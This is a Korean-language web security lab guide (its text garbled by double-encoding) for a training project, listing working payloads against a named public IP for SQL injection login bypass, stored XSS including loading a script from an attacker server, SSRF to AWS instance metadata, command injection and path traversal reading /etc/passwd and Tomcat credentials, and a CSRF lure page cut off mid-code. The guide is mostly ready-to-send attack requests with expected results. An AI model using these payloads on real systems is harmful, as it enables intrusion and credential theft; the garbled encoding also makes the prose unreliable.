---
sidebar_position: 1
title: ì›¹ ë³´ì•ˆ ì·¨ì•½ì  ìˆ˜ë™ ì§„ë‹¨ ê°€ì´ë“œ
description: OWASP TOP 10 (2021) ìˆ˜ë™ ì§„ë‹¨ ì ìš©í•´ë³´ê¸°
keywords: [sk]
draft: false
---
# ì›¹ ë³´ì•ˆ ì·¨ì•½ì  ì‹¤ìŠµ ê°€ì´ë“œ

> **í”„ë¡œì íŠ¸**: SK Rookies Mini Project 2  
> **ëŒ€ìƒ ì„œë²„**: http://3.34.212.183/  
> **ì‘ì„±ì¼**: 2025ë…„ 1ì›” 2ì¼  
> **ìµœì¢… ìˆ˜ì •**: 2025ë…„ 1ì›” 2ì¼ (v2.0)  
> **ì†Œìš” ì‹œê°„**: ì•½ 1-2ì‹œê°„

---

## ğŸ“‹ ëª©ì°¨

1. [ì‹¤ìŠµ í™˜ê²½ ì¤€ë¹„](#1-ì‹¤ìŠµ-í™˜ê²½-ì¤€ë¹„)
2. [SQL Injection - ë¡œê·¸ì¸ ìš°íšŒ](#2-sql-injection---ë¡œê·¸ì¸-ìš°íšŒ)
3. [Stored XSS - ë¬¸ì˜ ê²Œì‹œíŒ](#3-stored-xss---ë¬¸ì˜-ê²Œì‹œíŒ)
4. [SSRF - ì„œë²„ ì¸¡ ìš”ì²­ ìœ„ì¡°](#4-ssrf---ì„œë²„-ì¸¡-ìš”ì²­-ìœ„ì¡°)
5. [Command Injection - ì‹œìŠ¤í…œ ëª…ë ¹ ì‹¤í–‰](#5-command-injection---ì‹œìŠ¤í…œ-ëª…ë ¹-ì‹¤í–‰)
6. [Path Traversal - íŒŒì¼ ë‹¤ìš´ë¡œë“œ ì·¨ì•½ì ](#6-path-traversal---íŒŒì¼-ë‹¤ìš´ë¡œë“œ-ì·¨ì•½ì )
7. [ë¯¼ê°ì •ë³´ ë…¸ì¶œ - ë¹„ë°€ë²ˆí˜¸ í‰ë¬¸](#7-ë¯¼ê°ì •ë³´-ë…¸ì¶œ---ë¹„ë°€ë²ˆí˜¸-í‰ë¬¸)
8. [ê¶Œí•œ ê²€ì¦ ë¯¸í¡ - ê³µì§€ì‚¬í•­ ì‘ì„±](#8-ê¶Œí•œ-ê²€ì¦-ë¯¸í¡---ê³µì§€ì‚¬í•­-ì‘ì„±)
9. [CSRF - íšŒì› ì •ë³´ ë³€ê²½](#9-csrf---íšŒì›-ì •ë³´-ë³€ê²½)
10. [Kali Linux ë„êµ¬ í™œìš©](#10-kali-linux-ë„êµ¬-í™œìš©)
11. [ì²´í¬ë¦¬ìŠ¤íŠ¸](#11-ì²´í¬ë¦¬ìŠ¤íŠ¸)

---

## 1. ì‹¤ìŠµ í™˜ê²½ ì¤€ë¹„

### 1.1 BurpSuite ì„¤ì •

**Step 1)** BurpSuite ì‹¤í–‰
```bash
burpsuite
```

**Step 2)** í”„ë¡ì‹œ ë¦¬ìŠ¤ë„ˆ í™•ì¸
- `Proxy` â†’ `Options` â†’ `Proxy Listeners`
- `127.0.0.1:8080` í™œì„±í™” í™•ì¸

**Step 3)** ë¸Œë¼ìš°ì € í”„ë¡ì‹œ ì„¤ì • (Firefox ê¶Œì¥)
- ì„¤ì • â†’ ë„¤íŠ¸ì›Œí¬ ì„¤ì • â†’ ìˆ˜ë™ í”„ë¡ì‹œ ì„¤ì •
- HTTP í”„ë¡ì‹œ: `127.0.0.1`, í¬íŠ¸: `8080`

**Step 4)** Intercept ì¼œê¸°
- `Proxy` â†’ `Intercept is on`

### 1.2 í…ŒìŠ¤íŠ¸ ê³„ì • ìƒì„±

http://3.34.212.183/register.html ì—ì„œ ê³„ì • ìƒì„±:

| êµ¬ë¶„ | ì•„ì´ë”” | ë¹„ë°€ë²ˆí˜¸ | ì´ë©”ì¼ | ì—­í•  |
|------|--------|----------|--------|------|
| ê³µê²©ì | `attacker` | `Test1234!` | attacker@test.com | FREE |
| í”¼í•´ì | `victim` | `Test1234!` | victim@test.com | FREE |
| ê´€ë¦¬ì | `admin` | (ê¸°ì¡´ ê³„ì •) | admin@test.com | ADMIN |

---

## 2. SQL Injection - ë¡œê·¸ì¸ ìš°íšŒ

### 2.1 ì·¨ì•½ì  ì„¤ëª…

ë¡œê·¸ì¸ APIê°€ ì‚¬ìš©ì ì…ë ¥ì„ ì§ì ‘ SQL ì¿¼ë¦¬ì— ì—°ê²°í•˜ì—¬ ì¸ì¦ ìš°íšŒ ê°€ëŠ¥

**ì·¨ì•½ ì½”ë“œ** (AuthController.java:26-27):
```java
String sql = "SELECT * FROM users WHERE user_id = '" + id + "' AND password = '" + pw + "'";
```

**SQL ì¿¼ë¦¬ êµ¬ì¡° ë¶„ì„**:
```sql
SELECT * FROM users WHERE user_id = '[idê°’]' AND password = '[pwê°’]'
```

> âš ï¸ **ì¤‘ìš”**: `pw` íŒŒë¼ë¯¸í„°ê°€ ì¿¼ë¦¬ì˜ **ë§ˆì§€ë§‰**ì— ìœ„ì¹˜í•˜ë¯€ë¡œ, `pw`ì— ì¸ì ì…˜í•´ì•¼ ì£¼ì„(`--`)ìœ¼ë¡œ ë’·ë¶€ë¶„ì„ ë¬´ë ¥í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### 2.2 ëŒ€ìƒ API

```
POST /api/login
Content-Type: application/x-www-form-urlencoded

id=xxx&pw=xxx
```

### 2.3 ì‹¤ìŠµ ë°©ë²•

**Step 1)** ë¡œê·¸ì¸ í˜ì´ì§€ ì ‘ì†
- http://3.34.212.183/login.html

**Step 2)** ì•„ë¬´ ê°’ì´ë‚˜ ì…ë ¥í•˜ê³  ë¡œê·¸ì¸ ì‹œë„
- ID: `admin`
- PW: `test`

**Step 3)** BurpSuiteì—ì„œ ìš”ì²­ ìº¡ì²˜ í™•ì¸
```http
POST /api/login HTTP/1.1
Host: 3.34.212.183
Content-Type: application/x-www-form-urlencoded

id=admin&pw=test
```

**Step 4)** ìš”ì²­ì„ Repeaterë¡œ ì „ì†¡
- ìš”ì²­ ìš°í´ë¦­ â†’ `Send to Repeater`

**Step 5)** Payload ìˆ˜ì • í›„ Send

### 2.4 ê²€ì¦ëœ Payload ëª©ë¡

#### âœ… Payload 1: ê¸°ë³¸ OR ì¡°ê±´ (ê¶Œì¥)
```
id=admin&pw=test' OR '1'='1
```
**ìƒì„±ë˜ëŠ” SQL**:
```sql
SELECT * FROM users WHERE user_id = 'admin' AND password = 'test' OR '1'='1'
```
**ì›ë¦¬**: `OR '1'='1'`ì´ í•­ìƒ ì°¸ì´ë¯€ë¡œ ì „ì²´ ì¡°ê±´ì´ ì°¸ì´ ë¨

---

#### âœ… Payload 2: ì£¼ì„ ì²˜ë¦¬
```
id=admin&pw=' OR '1'='1'--
```
**ìƒì„±ë˜ëŠ” SQL**:
```sql
SELECT * FROM users WHERE user_id = 'admin' AND password = '' OR '1'='1'--'
```
**ì›ë¦¬**: `--` ì´í›„ëŠ” ì£¼ì„ ì²˜ë¦¬ë˜ì–´ ë¬´ì‹œë¨

---

#### âœ… Payload 3: í•­ìƒ ì°¸ì¸ ì¡°ê±´
```
id=admin&pw=' OR 1=1--
```
**ìƒì„±ë˜ëŠ” SQL**:
```sql
SELECT * FROM users WHERE user_id = 'admin' AND password = '' OR 1=1--'
```

---

#### âœ… Payload 4: ë¹ˆ IDë¡œ ì•„ë¬´ ê³„ì • ë¡œê·¸ì¸
```
id=x&pw=' OR '1'='1
```
**ìƒì„±ë˜ëŠ” SQL**:
```sql
SELECT * FROM users WHERE user_id = 'x' AND password = '' OR '1'='1'
```
**ì›ë¦¬**: ì¡´ì¬í•˜ì§€ ì•ŠëŠ” IDì—¬ë„ OR ì¡°ê±´ìœ¼ë¡œ ì²« ë²ˆì§¸ ì‚¬ìš©ìë¡œ ë¡œê·¸ì¸

---

#### âœ… Payload 5: UNION ê¸°ë°˜ (ë°ì´í„° ì¶”ì¶œìš©)
```
id=admin&pw=' UNION SELECT 'admin','admin','admin','admin@test.com','ADMIN','010','addr','Y'--
```
**ì›ë¦¬**: UNIONìœ¼ë¡œ ê°€ì§œ ê²°ê³¼ í–‰ì„ ì£¼ì…í•˜ì—¬ ì¸ì¦ ìš°íšŒ

---

### 2.5 URL ì¸ì½”ë”© ë²„ì „

BurpSuite Repeaterì—ì„œ íŠ¹ìˆ˜ë¬¸ì ë¬¸ì œ ì‹œ ì‚¬ìš©:
```
id=admin&pw=test'+OR+'1'%3d'1
```

### 2.6 ì˜ˆìƒ ê²°ê³¼

```
ë¡œê·¸ì¸ ì„±ê³µ
```

**ğŸ“¸ ìŠ¤í¬ë¦°ìƒ· í¬ì¸íŠ¸**: Repeater í™”ë©´ì—ì„œ Request/Response í•¨ê»˜ ìº¡ì²˜

### 2.7 ì‹¤íŒ¨í•˜ëŠ” Payload (ì°¸ê³ )

ë‹¤ìŒì€ **ë™ì‘í•˜ì§€ ì•ŠëŠ”** ì˜ˆì‹œì…ë‹ˆë‹¤:
```
# âŒ idì— ì¸ì ì…˜ - AND ì¡°ê±´ìœ¼ë¡œ ì¸í•´ ì‹¤íŒ¨
id=admin' OR '1'='1'--&pw=anything
```
**ì´ìœ **: `id`ì— ì¸ì ì…˜í•˜ë©´ `AND password = 'anything'` ì¡°ê±´ì´ ë‚¨ì•„ì„œ ì‹¤íŒ¨

---

## 3. Stored XSS - ë¬¸ì˜ ê²Œì‹œíŒ

### 3.1 ì·¨ì•½ì  ì„¤ëª…

ë¬¸ì˜ ì‘ì„± ì‹œ ì‚¬ìš©ì ì…ë ¥ì´ ì´ìŠ¤ì¼€ì´í”„ ì—†ì´ DBì— ì €ì¥ë˜ê³ , ëª©ë¡/ìƒì„¸ ì¡°íšŒ ì‹œ ê·¸ëŒ€ë¡œ ì¶œë ¥ë˜ì–´ ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰

**ì·¨ì•½ ì½”ë“œ** (InquiryController.java):
- ì €ì¥: PreparedStatement ì‚¬ìš© (SQL Injectionì€ ë°©ì–´ë¨)
- ì¶œë ¥: HTML ì´ìŠ¤ì¼€ì´í”„ ì—†ì´ JSONìœ¼ë¡œ ë°˜í™˜ â†’ í”„ë¡ íŠ¸ì—”ë“œì—ì„œ innerHTMLë¡œ ë Œë”ë§

### 3.2 ëŒ€ìƒ API

```
POST /api/inquiry/write  (ì €ì¥)
GET /api/inquiry/list    (ì‹¤í–‰ - ëª©ë¡)
GET /api/inquiry/detail  (ì‹¤í–‰ - ìƒì„¸)
```

### 3.3 ì‹¤ìŠµ ë°©ë²•

**Step 1)** ë¡œê·¸ì¸ ìƒíƒœì—ì„œ ë¬¸ì˜ ì‘ì„± í˜ì´ì§€ ì ‘ì†
- http://3.34.212.183/inquiry_write.html

**Step 2)** XSS Payload ì…ë ¥

### 3.4 ê²€ì¦ëœ Payload ëª©ë¡

#### âœ… Payload 1: ê¸°ë³¸ alert (ì œëª©ì— ì‚½ì…)
- ë¶„ë¥˜: `ê°•ì˜`
- ì œëª©: `<script>alert('XSS')</script>`
- ë‚´ìš©: `ì •ìƒ ë‚´ìš©`

---

#### âœ… Payload 2: ì¿ í‚¤ íƒˆì·¨ ì‹œë®¬ë ˆì´ì…˜ (ë‚´ìš©ì— ì‚½ì…)
- ë¶„ë¥˜: `ê°•ì˜`
- ì œëª©: `ì •ìƒ ì œëª©`
- ë‚´ìš©: `<script>alert(document.cookie)</script>`

---

#### âœ… Payload 3: ì´ë¯¸ì§€ íƒœê·¸ onerror
- ì œëª©: `<img src=x onerror="alert('XSS')">`

**ì›ë¦¬**: ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ì´ë¯¸ì§€ ë¡œë“œ ì‹¤íŒ¨ ì‹œ onerror í•¸ë“¤ëŸ¬ ì‹¤í–‰

---

#### âœ… Payload 4: SVG íƒœê·¸ í™œìš©
- ì œëª©: `<svg onload="alert('SVG XSS')">`

**ì›ë¦¬**: SVG ë¡œë“œ ì‹œ onload ì´ë²¤íŠ¸ ë°œìƒ

---

#### âœ… Payload 5: ì™¸ë¶€ ìŠ¤í¬ë¦½íŠ¸ ë¡œë“œ (ê³ ê¸‰)
- ë‚´ìš©: `<script src="http://ê³µê²©ìì„œë²„/evil.js"></script>`

**ì›ë¦¬**: ì™¸ë¶€ ì„œë²„ì˜ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ ë¡œë“œ

---

### 3.5 í™•ì¸ ë°©ë²•

**Step 3)** ë“±ë¡ í›„ ë¬¸ì˜ ëª©ë¡ í˜ì´ì§€ ì ‘ì†
- http://3.34.212.183/board.html

**Step 4)** alert ì°½ ì‹¤í–‰ í™•ì¸

### 3.6 ì˜ˆìƒ ê²°ê³¼

ëª©ë¡ í˜ì´ì§€ ë˜ëŠ” ìƒì„¸ í˜ì´ì§€ ì ‘ì† ì‹œ JavaScript alert ì°½ ì‹¤í–‰

**ğŸ“¸ ìŠ¤í¬ë¦°ìƒ· í¬ì¸íŠ¸**: 
1. alert ì°½ì´ ëœ¬ í™”ë©´
2. ê°œë°œì ë„êµ¬(F12) â†’ Elements íƒ­ì—ì„œ ìŠ¤í¬ë¦½íŠ¸ íƒœê·¸ í™•ì¸

---

## 4. SSRF - ì„œë²„ ì¸¡ ìš”ì²­ ìœ„ì¡°

### 4.1 ì·¨ì•½ì  ì„¤ëª…

í”„ë¡ì‹œ APIê°€ ì‚¬ìš©ì ì…ë ¥ URLì— ëŒ€í•´ **ì•„ë¬´ëŸ° ê²€ì¦ ì—†ì´** ì„œë²„ì—ì„œ ì§ì ‘ ìš”ì²­ì„ ìˆ˜í–‰

**ì·¨ì•½ ì½”ë“œ** (InquiryController.java:167-175):
```java
@GetMapping("/api/inquiry/proxy")
public ResponseEntity<byte[]> proxy(@RequestParam String url) {
    // [ì·¨ì•½ì ] ì…ë ¥ëœ URLì— ëŒ€í•´ ì•„ë¬´ëŸ° ê²€ì¦ ì—†ì´ ì„œë²„ê°€ ì§ì ‘ ì ‘ì†
    URL targetUrl = new URL(url);
    HttpURLConnection connection = (HttpURLConnection) targetUrl.openConnection();
    connection.setRequestMethod("GET");
    // ...
}
```

### 4.2 ëŒ€ìƒ API

```
GET /api/inquiry/proxy?url=xxx
```

### 4.3 ì‹¤ìŠµ ë°©ë²•

**Step 1)** ë¸Œë¼ìš°ì €ì—ì„œ ì§ì ‘ í…ŒìŠ¤íŠ¸

### 4.4 ê²€ì¦ëœ Payload ëª©ë¡

#### âœ… Payload 1: ì™¸ë¶€ ì‚¬ì´íŠ¸ ì ‘ê·¼ (ì •ìƒ ë™ì‘ í™•ì¸)
```
http://3.34.212.183/api/inquiry/proxy?url=http://example.com
```
**ê²°ê³¼**: example.comì˜ HTML ë‚´ìš©ì´ ë°˜í™˜ë¨

---

#### âœ… Payload 2: ë‚´ë¶€ ì„œë¹„ìŠ¤ ìŠ¤ìº” (localhost)
```
http://3.34.212.183/api/inquiry/proxy?url=http://localhost:8080/
```
**ì›ë¦¬**: ì„œë²„ ìì‹ ì˜ Tomcatì— ì ‘ê·¼

---

#### âœ… Payload 3: ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ ìŠ¤ìº” (127.0.0.1)
```
http://3.34.212.183/api/inquiry/proxy?url=http://127.0.0.1:3306/
```
**ì›ë¦¬**: ë‚´ë¶€ MariaDB í¬íŠ¸ ì ‘ê·¼ ì‹œë„

---

#### âœ… Payload 4: AWS ë©”íƒ€ë°ì´í„° ì ‘ê·¼ (í´ë¼ìš°ë“œ í™˜ê²½)
```
http://3.34.212.183/api/inquiry/proxy?url=http://169.254.169.254/latest/meta-data/
```
**ì›ë¦¬**: AWS EC2 ì¸ìŠ¤í„´ìŠ¤ ë©”íƒ€ë°ì´í„° API ì ‘ê·¼ â†’ IAM ìê²© ì¦ëª… íƒˆì·¨ ê°€ëŠ¥

---

#### âœ… Payload 5: íŒŒì¼ í”„ë¡œí† ì½œ (ì‹¤íŒ¨í•  ìˆ˜ ìˆìŒ)
```
http://3.34.212.183/api/inquiry/proxy?url=file:///etc/passwd
```
**ì›ë¦¬**: file:// í”„ë¡œí† ì½œë¡œ ì„œë²„ ë¡œì»¬ íŒŒì¼ ì½ê¸° ì‹œë„

---

### 4.5 BurpSuite í…ŒìŠ¤íŠ¸

**Step 2)** BurpSuite Repeaterì—ì„œ í…ŒìŠ¤íŠ¸
```http
GET /api/inquiry/proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: 3.34.212.183
```

### 4.6 ì˜ˆìƒ ê²°ê³¼

**AWS ë©”íƒ€ë°ì´í„° ì ‘ê·¼ ì„±ê³µ ì‹œ**:
```
ami-id
ami-launch-index
ami-manifest-path
hostname
instance-id
instance-type
...
```

**ğŸ“¸ ìŠ¤í¬ë¦°ìƒ· í¬ì¸íŠ¸**: 
1. ë‚´ë¶€ ì„œë¹„ìŠ¤ ì‘ë‹µ í™”ë©´
2. AWS ë©”íƒ€ë°ì´í„° ë…¸ì¶œ í™”ë©´

---

## 5. Command Injection - ì‹œìŠ¤í…œ ëª…ë ¹ ì‹¤í–‰

### 5.1 ì·¨ì•½ì  ì„¤ëª…

Ping APIê°€ ì‚¬ìš©ì ì…ë ¥ì„ ì‰˜ ëª…ë ¹ì–´ì— ì§ì ‘ ì—°ê²°í•˜ì—¬ ì„ì˜ ëª…ë ¹ ì‹¤í–‰ ê°€ëŠ¥

**ì·¨ì•½ ì½”ë“œ** (PingController.java:36-41):
```java
String[] cmd;
if (os.contains("win")) {
    cmd = new String[] { "cmd.exe", "/c", "ping -n 1 " + host };
} else {
    cmd = new String[] { "sh", "-c", "ping -c 1 " + host };  // ì‰˜ í˜¸ì¶œ!
}
Process process = Runtime.getRuntime().exec(cmd);
```

> âš ï¸ **ê¶Œí•œ í•„ìš”**: ì´ APIëŠ” **ADMIN ê¶Œí•œ**ì´ í•„ìš”í•©ë‹ˆë‹¤.

### 5.2 ëŒ€ìƒ API

```
GET /api/ping?host=xxx
Cookie: JSESSIONID=ê´€ë¦¬ìì„¸ì…˜
```

### 5.3 ì‹¤ìŠµ ë°©ë²•

**Step 1)** ê´€ë¦¬ì ê³„ì •ìœ¼ë¡œ ë¡œê·¸ì¸ í•„ìš”
- `admin` ê³„ì • ë˜ëŠ” ADMIN ì—­í•  ê³„ì •

**Step 2)** BurpSuite Repeaterì—ì„œ í…ŒìŠ¤íŠ¸

### 5.4 ê²€ì¦ëœ Payload ëª©ë¡

#### âœ… Payload 1: ì„¸ë¯¸ì½œë¡ ìœ¼ë¡œ ëª…ë ¹ì–´ ì—°ê²°
```
GET /api/ping?host=8.8.8.8;id HTTP/1.1
Host: 3.34.212.183
Cookie: JSESSIONID=ê´€ë¦¬ìì„¸ì…˜ID
```
**ìƒì„±ë˜ëŠ” ëª…ë ¹ì–´**: `ping -c 1 8.8.8.8;id`

**ì˜ˆìƒ ê²°ê³¼**:
```
PING 8.8.8.8 ...
uid=1000(ubuntu) gid=1000(ubuntu) groups=...
```

---

#### âœ… Payload 2: íŒŒì´í”„ë¡œ ì¶œë ¥ ì „ë‹¬
```
GET /api/ping?host=8.8.8.8|cat /etc/passwd HTTP/1.1
```
**ìƒì„±ë˜ëŠ” ëª…ë ¹ì–´**: `ping -c 1 8.8.8.8|cat /etc/passwd`

---

#### âœ… Payload 3: ë°±í‹±ìœ¼ë¡œ ëª…ë ¹ì–´ ì¹˜í™˜
```
GET /api/ping?host=`whoami`.example.com HTTP/1.1
```
**ì›ë¦¬**: ë°±í‹± ë‚´ ëª…ë ¹ì–´ê°€ ë¨¼ì € ì‹¤í–‰ë¨

---

#### âœ… Payload 4: AND ì—°ì‚°ì
```
GET /api/ping?host=8.8.8.8 && cat /etc/passwd HTTP/1.1
```
**URL ì¸ì½”ë”©**:
```
GET /api/ping?host=8.8.8.8%20%26%26%20cat%20/etc/passwd HTTP/1.1
```

---

#### âœ… Payload 5: ê°œí–‰ ë¬¸ìë¡œ ëª…ë ¹ì–´ ë¶„ë¦¬
```
GET /api/ping?host=8.8.8.8%0aid HTTP/1.1
```
**ì›ë¦¬**: `%0a`ëŠ” ì¤„ë°”ê¿ˆ(LF) â†’ ìƒˆ ëª…ë ¹ì–´ë¡œ í•´ì„

---

### 5.5 ì˜ˆìƒ ê²°ê³¼

ì‹œìŠ¤í…œ ëª…ë ¹ì–´ ì‹¤í–‰ ê²°ê³¼ê°€ ì‘ë‹µì— í¬í•¨ë¨

**ğŸ“¸ ìŠ¤í¬ë¦°ìƒ· í¬ì¸íŠ¸**: 
1. `id` ë˜ëŠ” `whoami` ì‹¤í–‰ ê²°ê³¼
2. `/etc/passwd` íŒŒì¼ ë‚´ìš©

---

## 6. Path Traversal - íŒŒì¼ ë‹¤ìš´ë¡œë“œ ì·¨ì•½ì 

### 6.1 ì·¨ì•½ì  ì„¤ëª…

íŒŒì¼ ë‹¤ìš´ë¡œë“œ APIê°€ ê²½ë¡œ ê²€ì¦ ì—†ì´ ì‚¬ìš©ì ì…ë ¥ì„ íŒŒì¼ ê²½ë¡œì— ì§ì ‘ ì‚¬ìš©

**ì·¨ì•½ ì½”ë“œ** (FileController.java:21-23):
```java
@GetMapping("/api/file/download")
public ResponseEntity<Resource> downloadFile(@RequestParam String saveName, ...) {
    Path path = Paths.get("uploads/" + saveName);  // ê²½ë¡œ ê²€ì¦ ì—†ìŒ!
    // ...
}
```

### 6.2 ëŒ€ìƒ API

```
GET /api/file/download?saveName=xxx&originName=xxx
```

### 6.3 ì‹¤ìŠµ ë°©ë²•

**Step 1)** BurpSuite Repeaterì—ì„œ í…ŒìŠ¤íŠ¸

### 6.4 ê²€ì¦ëœ Payload ëª©ë¡

#### âœ… Payload 1: ìƒìœ„ ë””ë ‰í† ë¦¬ ì´ë™ (../etc/passwd)
```
GET /api/file/download?saveName=../../../etc/passwd&originName=passwd.txt HTTP/1.1
Host: 3.34.212.183
```
**ì›ë¦¬**: `../`ë¡œ uploads ë””ë ‰í† ë¦¬ë¥¼ ë²—ì–´ë‚˜ ì‹œìŠ¤í…œ íŒŒì¼ ì ‘ê·¼

---

#### âœ… Payload 2: Tomcat ì„¤ì • íŒŒì¼
```
GET /api/file/download?saveName=../../opt/tomcat/apache-tomcat-9.0.30/conf/tomcat-users.xml&originName=config.xml HTTP/1.1
```
**ëª©ì **: Tomcat ê´€ë¦¬ì ê³„ì • ì •ë³´ íƒˆì·¨

---

#### âœ… Payload 3: ì• í”Œë¦¬ì¼€ì´ì…˜ ì„¤ì • íŒŒì¼
```
GET /api/file/download?saveName=../application.properties&originName=config.txt HTTP/1.1
```
**ëª©ì **: DB ì ‘ì† ì •ë³´ ë“± ë¯¼ê° ì„¤ì • íƒˆì·¨

---

#### âœ… Payload 4: URL ì¸ì½”ë”© ìš°íšŒ
```
GET /api/file/download?saveName=..%2F..%2F..%2Fetc%2Fpasswd&originName=passwd.txt HTTP/1.1
```
**ì›ë¦¬**: `%2F`ëŠ” `/`ì˜ URL ì¸ì½”ë”©

---

#### âœ… Payload 5: ì´ì¤‘ ì¸ì½”ë”© ìš°íšŒ
```
GET /api/file/download?saveName=..%252F..%252F..%252Fetc%252Fpasswd&originName=passwd.txt HTTP/1.1
```
**ì›ë¦¬**: ì¼ë¶€ WAF ìš°íšŒìš©

---

### 6.5 ì˜ˆìƒ ê²°ê³¼

ì‹œìŠ¤í…œ íŒŒì¼ì´ ë‹¤ìš´ë¡œë“œë¨

**ğŸ“¸ ìŠ¤í¬ë¦°ìƒ· í¬ì¸íŠ¸**: 
1. `/etc/passwd` íŒŒì¼ ë‹¤ìš´ë¡œë“œ ì„±ê³µ í™”ë©´
2. íŒŒì¼ ë‚´ìš© í™•ì¸

---

## 7. ë¯¼ê°ì •ë³´ ë…¸ì¶œ - ë¹„ë°€ë²ˆí˜¸ í‰ë¬¸

### 7.1 ì·¨ì•½ì  ì„¤ëª…

íšŒì›ì •ë³´ ì¡°íšŒ APIê°€ ë¹„ë°€ë²ˆí˜¸ë¥¼ í‰ë¬¸ìœ¼ë¡œ ì‘ë‹µì— í¬í•¨

**ì·¨ì•½ ì½”ë“œ** (MemberController.java:38):
```java
userInfo.put("password", rs.getString("password"));  // ë¹„ë°€ë²ˆí˜¸ ë…¸ì¶œ!
```

### 7.2 ëŒ€ìƒ API

```
GET /api/member/me
Cookie: JSESSIONID=ë¡œê·¸ì¸ì„¸ì…˜
```

### 7.3 ì‹¤ìŠµ ë°©ë²•

**Step 1)** ë¡œê·¸ì¸
- http://3.34.212.183/login.html
- `attacker` / `Test1234!`

**Step 2)** ë¸Œë¼ìš°ì €ì—ì„œ ì§ì ‘ API í˜¸ì¶œ
- ì£¼ì†Œì°½ì— ì…ë ¥: `http://3.34.212.183/api/member/me`

**ë˜ëŠ” BurpSuiteë¡œ í™•ì¸:**

**Step 3)** ë§ˆì´í˜ì´ì§€ ì ‘ì†
- http://3.34.212.183/mypage.html

**Step 4)** BurpSuite â†’ `HTTP history` íƒ­ì—ì„œ `/api/member/me` ìš”ì²­ ì°¾ê¸°

**Step 5)** Response í™•ì¸

### 7.4 ì˜ˆìƒ ê²°ê³¼

```json
{
  "userId": "attacker",
  "name": "í…ŒìŠ¤íŠ¸",
  "email": "attacker@test.com",
  "role": "FREE",
  "phone": "010-1111-1111",
  "address": "ì„œìš¸ì‹œ",
  "password": "Test1234!",
  "marketingAgree": false
}
```

**ğŸ“¸ ìŠ¤í¬ë¦°ìƒ· í¬ì¸íŠ¸**: Responseì—ì„œ `"password"` í•„ë“œê°€ ë³´ì´ëŠ” ë¶€ë¶„

---

## 8. ê¶Œí•œ ê²€ì¦ ë¯¸í¡ - ê³µì§€ì‚¬í•­ ì‘ì„±

### 8.1 ì·¨ì•½ì  ì„¤ëª…

ê³µì§€ì‚¬í•­ ì‘ì„± APIê°€ ë¡œê·¸ì¸ ì—¬ë¶€ë§Œ í™•ì¸í•˜ê³  ê´€ë¦¬ì(ADMIN) ê¶Œí•œì€ í™•ì¸í•˜ì§€ ì•ŠìŒ

**ì·¨ì•½ ì½”ë“œ** (NoticeController.java:42-46):
```java
String loginUser = (String) session.getAttribute("loginUser");
if (loginUser == null) return "ë¡œê·¸ì¸ í•„ìš”";
// role ì²´í¬ ì—†ìŒ! ëˆ„êµ¬ë‚˜ ê³µì§€ ì‘ì„± ê°€ëŠ¥
```

### 8.2 ëŒ€ìƒ API

```
POST /api/notice/write
Content-Type: application/x-www-form-urlencoded

type=xxx&title=xxx&content=xxx
```

### 8.3 ì‹¤ìŠµ ë°©ë²•

**Step 1)** ì¼ë°˜ ì‚¬ìš©ìë¡œ ë¡œê·¸ì¸
- `attacker` / `Test1234!` (FREE íšŒì›)

**Step 2)** BurpSuite Repeaterì—ì„œ ì§ì ‘ ìš”ì²­ ì „ì†¡

```http
POST /api/notice/write HTTP/1.1
Host: 3.34.212.183
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=ì—¬ê¸°ì—_ì„¸ì…˜ID_ì…ë ¥

type=ê³µì§€&title=í•´í‚¹ëœ ê³µì§€ì‚¬í•­&content=ì¼ë°˜ ì‚¬ìš©ìê°€ ì‘ì„±í•œ ê³µì§€ì…ë‹ˆë‹¤
```

**Step 3)** ê³µì§€ì‚¬í•­ ëª©ë¡ì—ì„œ í™•ì¸
- http://3.34.212.183/notice.html

### 8.4 ì˜ˆìƒ ê²°ê³¼

```
ê³µì§€ ë“±ë¡ ì™„ë£Œ
```

ì¼ë°˜ ì‚¬ìš©ì(FREE)ê°€ ê³µì§€ì‚¬í•­ ë“±ë¡ ì„±ê³µ

**ğŸ“¸ ìŠ¤í¬ë¦°ìƒ· í¬ì¸íŠ¸**: 
1. Repeater ìš”ì²­/ì‘ë‹µ
2. ê³µì§€ì‚¬í•­ ëª©ë¡ì—ì„œ ë“±ë¡ëœ ê¸€ í™•ì¸

### 8.5 ë¹„êµ: ê°•ì˜ìë£ŒëŠ” ê¶Œí•œ ì²´í¬í•¨

```
POST /api/material/write
```
â†’ `ê¶Œí•œì´ ì—†ìŠµë‹ˆë‹¤.` ì‘ë‹µ (ì •ìƒ ë™ì‘)

**LectureMaterialController.java (ì•ˆì „í•œ ì½”ë“œ)**:
```java
if (!rs.next() || !"ADMIN".equals(rs.getString("role"))) {
    return "ê¶Œí•œì´ ì—†ìŠµë‹ˆë‹¤.";
}
```

---

## 9. CSRF - íšŒì› ì •ë³´ ë³€ê²½

### 9.1 ì·¨ì•½ì  ì„¤ëª…

ëª¨ë“  ìƒíƒœ ë³€ê²½ APIì— CSRF í† í°ì´ ì—†ì–´ì„œ, ì•…ì„± í˜ì´ì§€ì—ì„œ ì‚¬ìš©ì ëª¨ë¥´ê²Œ ìš”ì²­ ê°€ëŠ¥

**ì·¨ì•½ í¬ì¸íŠ¸** (MemberController.java):
- `PUT /api/member/update` - CSRF í† í° ì—†ìŒ
- `DELETE /api/member/withdraw` - CSRF í† í° ì—†ìŒ

### 9.2 ëŒ€ìƒ API

```
PUT /api/member/update
DELETE /api/member/withdraw
```

### 9.3 ì‹¤ìŠµ ë°©ë²•

**Step 1)** ê³µê²©ìš© HTML íŒŒì¼ ìƒì„± (ë¡œì»¬ì—ì„œ)

`csrf_test.html`:
```html
<!DOCTYPE html>
<html>
<head>
    <title>ë¬´ë£Œ ê²½í’ˆ ì´ë²¤íŠ¸!</title>
</head>
<body>
    <h1>ğŸ ì¶•í•˜í•©ë‹ˆë‹¤! ê²½í’ˆì— ë‹¹ì²¨ë˜ì…¨ìŠµë‹ˆë‹¤!</h1>
    <p>ì•„ë˜ ë²„íŠ¼ì„ í´ë¦­í•˜ì„¸ìš”.</p>
    
    <!-- íšŒì›ì •ë³´ ìˆ˜ì • CSRF -->
    <script>
        function attack() {
            fetch('http://3.34.212.183/api/member/update', {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json'
                },
